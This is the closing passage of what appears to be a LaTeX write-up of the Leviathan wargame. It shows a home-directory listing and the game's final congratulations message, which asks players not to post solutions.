-rw-r--r--   1 root       root       3851 Oct 14 09:19 .bashrc
-r--r-----   1 leviathan7 leviathan7  178 Oct 14 09:27 CONGRATULATIONS
-rw-r--r--   1 root       root        807 Mar 31  2024 .profile
leviathan7@leviathan:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
\end{lstlisting}
\end{document}
